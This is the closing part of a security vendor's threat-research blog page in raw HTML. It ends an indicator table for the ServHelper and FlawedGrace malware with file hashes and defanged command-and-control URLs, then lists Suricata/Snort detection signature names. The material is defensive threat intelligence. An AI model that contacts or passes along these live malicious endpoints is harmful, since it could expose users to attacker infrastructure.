			<p>9fccd107bd0aee3a2f39ad76a49758309c95545d8154b808eec24d2b51dc4579</p>
			</td>
			<td style="width:88px;">
			<p>SHA256</p>
			</td>
			<td style="width:154px;">
			<p>“sethijack” command ServHelper</p>
			</td>
		</tr>
		<tr>
			<td style="width:382px;">
			<p>hxxp://dedsolutions[.]bit/sav/s.php</p>
			</td>
			<td style="width:88px;">
			<p>URL</p>
			</td>
			<td style="width:154px;">
			<p>“sethijack” command ServHelper C&amp;C</p>
			</td>
		</tr>
		<tr>
			<td style="width:382px;">
			<p>hxxp://dedoshop[.]pw/sav/s.php</p>
			</td>
			<td style="width:88px;">
			<p>URL</p>
			</td>
			<td style="width:154px;">
			<p>“sethijack” command ServHelper C&amp;C</p>
			</td>
		</tr>
		<tr>
			<td style="width:382px;">
			<p>hxxp://asgaage[.]pw/sav/s.php</p>
			</td>
			<td style="width:88px;">
			<p>URL</p>
			</td>
			<td style="width:154px;">
			<p>“sethijack” command ServHelper C&amp;C</p>
			</td>
		</tr>
		<tr>
			<td style="width:382px;">
			<p>hxxp://sghee[.]pw/sav/s.php</p>
			</td>
			<td style="width:88px;">
			<p>URL</p>
			</td>
			<td style="width:154px;">
			<p>“sethijack” command ServHelper C&amp;C</p>
			</td>
		</tr>
		<tr>
			<td style="width:382px;">
			<p>a9492312f1258567c3633ed077990fe053776cd576aa60ac7589c6bd7829d549</p>
			</td>
			<td style="width:88px;">
			<p>SHA256</p>
			</td>
			<td style="width:154px;">
			<p>“loaddll” command ServHelper</p>
			</td>
		</tr>
		<tr>
			<td style="width:382px;">
			<p>hxxps://vesecase[.]com/support/form.php</p>
			</td>
			<td style="width:88px;">
			<p>URL</p>
			</td>
			<td style="width:154px;">
			<p>“loaddll” command ServHelper C&amp;C</p>
			</td>
		</tr>
	</tbody>
</table>

<p>&nbsp;</p>

<p><strong>ET and ETPRO Suricata/Snort Signatures</strong></p>

<p>2833522&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ETPRO TROJAN Observed Malicious SSL Cert (HuadhServHelper RAT CnC)</p>

<p>2833552&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ETPRO TROJAN HuadhServHelper RAT CnC Domain Observed in SNI</p>

<p>2833881&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ETPRO TROJAN Observed Malicious SSL Cert (ServHelper CnC)</p>

<p>2833985&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ETPRO TROJAN Observed Malicious SSL Cert (ServHelper CnC)</p>

<p>2834074&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ETPRO TROJAN Observed Malicious SSL Cert (ServHelper CnC)</p>

<p>2834233&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ETPRO TROJAN ServHelper CnC Inital Checkin</p>

<p>2828489&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ETPRO TROJAN FlawedGrace CnC Activity</p>

</div>
  </div>

      <div class="blog__content-pager">
      
  <div class="content-pager _legacy_blocks _content_pager">
    <div class="content-pager__items-wrapper">
      <div class="content-pager__items">
        <div class="content-pager__item content-pager__item--prev">
          <a href="/us/threat-insight/post/phishing-template-uses-fake-fonts-decode-content-and-evade-detection" hreflang="en">Previous Blog Post</a>
        </div>
        <div class="content-pager__item content-pager__item--next">
          <a href="/us/threat-insight/post/proofpoint-releases-q4-2018-threat-report-and-year-review" hreflang="en">Next Blog Post</a>
        </div>
      </div>
    </div>
  </div>

    </div>
        




  
        
<div class="subscribe-block blog-subscribe _legacy_blocks _subscribe-block subscribe-block--black blog-subscribe--black v3-dark-bg-only" data-animate="true">
  <div class="subscribe-block__inner blog-subscribe__inner">
    <div class="subscribe-block__copy">
      

      
<h3 class="subscribe-block__heading">
      Subscribe to the Proofpoint Blog
  </h3>

          </div>
    <div class="subscribe-block__form">
        <div class="mk-form">
  <div class="mk-form__form-container _legacy_element _marketo_form">
    <script type="IN/Form2"
      data-data-form="mktoForm_19277"
      data-field-firstname="FirstName"
      data-field-lastname="LastName"
      data-field-email="Email"
      data-field-company="Company"
      data-field-title="Title"
      data-field-state="State"
      data-field-country="Country"
    ></script>
    <form
      id="mktoForm_19277"
      data-mkto-id="19277"
      data-mkto-base="//go.proofpoint.com"
      data-munchkin-id="309-RHV-619"
      data-submit-text=""
      data-redirect-link=""
      data-prefill=""
      data-event-label=""
      data-lang-code="us"
      data-validate-email="1"
      class="mk-form__form marketo-form-block__form"
    ></form>
  </div>
</div>


    </div>
  </div>
</div>



  </article>


  </div>

  </div>

      </div>
    </section>
  </main>

</div>

<div class="footer-v3" data-animate="true">
  <div class="footer-v3__inner">
          <nav class="footer-v3__nav">
        <div class="footer-v3__nav-wrapper">
          <div class="footer-v3__nav-heading">Products</div>
          <ul class="footer-v3__nav-collapsible">
            <li><a href="/us/products/protect-people">Protect People</a></li>
            <li><a href="/us/products/defend-data">Defend Data</a></li>
            <li><a href="/us/products/mitigate-human-risk">Mitigate Human Risk</a></li>
            <li><a href="/us/products/premium-services">Premium Services</a></li>
          </ul>
        </div>
        <div class="footer-v3__nav-wrapper">
          <div class="footer-v3__nav-heading">Get Support</div>
          <ul class="footer-v3__nav-collapsible">
            <li><a href="https://proofpoint.my.site.com/community/s/" target="_blank">Product Support Login</a></li>
            <li><a href="/us/support-services">Support Services</a></li>
            <li><a href="https://ipcheck.proofpoint.com" target="_blank">IP Address Blocked?</a></li>
          </ul>
        </div>
        <div class="footer-v3__nav-wrapper">
          <div class="footer-v3__nav-heading">Connect with Us</div>
          <ul class="footer-v3__nav-collapsible">
            <li><a href="tel:+1-408-517-4710" class="icon-phone-ppoint">+1-408-517-4710</a></li>
            <li><a href="/us/events">Attend an Event</a></li>
            <li><a href="/us/contact">Contact Us</a></li>
            <li><a href="/us/free-demo-request">Free Demo Request</a></li>
          </ul>
        </div>
        <div class="footer-v3__nav-wrapper">
          <div class="footer-v3__nav-heading">More</div>
          <ul class="footer-v3__nav-collapsible">
            <li><a href="/us/company/about">About Proofpoint</a></li>
            <li><a href="/us/why-proofpoint">Why Proofpoint</a></li>
            <li><a href="/us/company/careers">Careers</a></li>
            <li><a href="/us/leadership-team">Leadership Team</a></li>
            <li><a href="/us/newsroom">News Center</a></li>
            <li><a href="/us/legal/trust">Privacy and Trust</a></li>
          </ul>
        </div>
      </nav>
        <div class="footer-v3__bottom-wrap">
      <section class="footer-v3__bottom">
        <div class="footer-v3__logo">
          <a href="/us" class="footer-v3__logo-link">
            <div class="footer-v3__logo-image"></div>
          </a>
          <div class="footer-v3__bottom-copyright-info">&copy;
            2025.
            All rights reserved.
          </div>
        </div>
        <div class="footer-v3__bottom-copyright">
          <a class="footer-v3__bottom-copyright-info" href="/us/legal/license">Terms and conditions</a>
          <a class="footer-v3__bottom-copyright-info" href="/us/legal/privacy-policy">Privacy Policy</a>
          <a class="footer-v3__bottom-copyright-info" href="/us/sitemap">Sitemap</a>
        </div>
        <ul class="footer-v3__bottom-social-menu">
          <li>
            <a href="http://www.facebook.com/proofpoint" class="icon-facebook" target="_blank"></a>
          </li>
          <li>
            <a href="http://www.twitter.com/proofpoint" class="icon-twitter" target="_blank"></a>
          </li>
          <li>
            <a href="https://www.linkedin.com/company/proofpoint" class="icon-linkedin" target="_blank"></a>
          </li>
          <li>
            <a href="https://www.youtube.com/channel/UCIvtJgsrUzFo90NKeiVozhQ" class="icon-youtube-play" target="_blank"></a>
          </li>
          <li>
            <a href="https://www.instagram.com/proofpoint" class="icon-instagram" target="_blank"></a>
          </li>
        </ul>
      </section>
    </div>
  </div>
</div>


  </div>

      <script type="text/javascript">document.write(unescape("%3Cscript src='//munchkin.marketo.net/munchkin.js' type='text/javascript'%3E%3C/script%3E")); </script> <script>Munchkin.init('309-RHV-619');</script><div class="element-invisible" style="clear:both;"><!-- Google Code for Remarketing Tag -->
                <!--------------------------------------------------
                Remarketing tags may not be associated with personally identifiable information or placed on pages related to sensitive categories. See more information and instructions on how to setup the tag on: http://google.com/ads/remarketingsetup
                --------------------------------------------------->
                <script type="text/javascript">
                /* <![CDATA[ */
                var google_conversion_id = 950296937;
                var google_custom_params = window.google_tag_params;
                var google_remarketing_only = true;
                /* ]]> */
                </script>
                <script type="text/javascript" src="//www.googleadservices.com/pagead/conversion.js">
                </script>
                <noscript>
                <div style="display:inline;">
                <img height="1" width="1" style="border-style:none;" alt="" src="//googleads.g.doubleclick.net/pagead/viewthroughconversion/950296937/?value=0&amp;guid=ON&amp;script=0"/>
                </div>
                </noscript></div>
    </div>
    <div id="flyout-container"></div>
    <script type="application/json" data-drupal-selector="drupal-settings-json">{"path":{"baseUrl":"\/","pathPrefix":"us\/","currentPath":"node\/50006","currentPathIsAdmin":false,"isFront":false,"currentLanguage":"en"},"pluralDelimiter":"\u0003","suppressDeprecationErrors":true,"ajaxPageState":{"libraries":"eJxVj0GOBCEIRS9Uxkxm07eZgE2rKQWD2EnffqxadFkbEh7w_6eBWg6FPBYJu-sDe9CM5HCYCW9tmcd7dy0vXAmeQUfFfsEgbMTmGkTSFety-RIxUvf-vVAsglAcFarzfBGMIrGQe8mNpmk9FRjed5Z5Cb48eDy8tfaXfx7sC3AcM597klEw0WNSQXcy8XVwSHvmg3UCDckPy6WffQKdske1lE9kaQb2BsiAeLp_mUhB0K1_ulH1CJ3-Ae6OlH4","theme":"particle","theme_token":null},"ajaxTrustedUrl":[],"vwo":{"id":1002484,"timeout_library":2500,"timeout_setting":2000,"usejquery":"false","testnull":null},"pp_i18n":{"language":"us"},"instantsearch":{"indexName":"content","path":"search"},"user":{"uid":0,"permissionsHash":"950e699712383dfb12102e31b44368231fb90da457b28535a744dde764a08ef5"}}</script>
<script src="/sites/default/files/js/js_0PTCwSWOAiJfplqS7IFUoDMAex3W5Bbe_Jb-l5UBdEg.js?scope=footer&amp;delta=0&amp;language=en&amp;theme=particle&amp;include=eJxNjVEKwzAMQy-0Yva32xTH82LTxA6Oc_-tZbD9CCTxpDF2vT8MGlpdWHl7cjKlx22MvWMcnA59GcmhdmaTMUhgpbZ5-hTuDOneCn4gjFRqDOTBfzUWw1LU6jUhGAyXpuj8Qd-_7eXR38ApO00"></script>
<script src="https://geoip-js.com/js/apis/geoip2/v2.1/geoip2.js"></script>
<script src="/sites/default/files/js/js_wkNfGxWc0_xjHnljIpXLLuxGbYfbmVyUkyJqtaY6aW8.js?scope=footer&amp;delta=2&amp;language=en&amp;theme=particle&amp;include=eJxNjVEKwzAMQy-0Yva32xTH82LTxA6Oc_-tZbD9CCTxpDF2vT8MGlpdWHl7cjKlx22MvWMcnA59GcmhdmaTMUhgpbZ5-hTuDOneCn4gjFRqDOTBfzUWw1LU6jUhGAyXpuj8Qd-_7eXR38ApO00"></script>
<script src="//munchkin.marketo.net/munchkin.js"></script>
<script src="/sites/default/files/js/js_zEAv3h028JMo53L_-Row7FrtbUFIpsoOM8aflgqba6U.js?scope=footer&amp;delta=4&amp;language=en&amp;theme=particle&amp;include=eJxNjVEKwzAMQy-0Yva32xTH82LTxA6Oc_-tZbD9CCTxpDF2vT8MGlpdWHl7cjKlx22MvWMcnA59GcmhdmaTMUhgpbZ5-hTuDOneCn4gjFRqDOTBfzUWw1LU6jUhGAyXpuj8Qd-_7eXR38ApO00"></script>
<script src="/themes/custom/proofpoint/apps/drupal/../../dist/app-drupal/assets/js/app.js?q=YC7QVdT6O4o&amp;v=1"></script>
<script src="/sites/default/files/js/js_zzdzQ-ZTO1G8iCWRlb03McG3cjvNopJ7pLFZ6iL6viI.js?scope=footer&amp;delta=6&amp;language=en&amp;theme=particle&amp;include=eJxNjVEKwzAMQy-0Yva32xTH82LTxA6Oc_-tZbD9CCTxpDF2vT8MGlpdWHl7cjKlx22MvWMcnA59GcmhdmaTMUhgpbZ5-hTuDOneCn4gjFRqDOTBfzUWw1LU6jUhGAyXpuj8Qd-_7eXR38ApO00"></script>
<script src="//go.proofpoint.com/js/forms2/js/forms2.min.js"></script>

  </body>
</html>
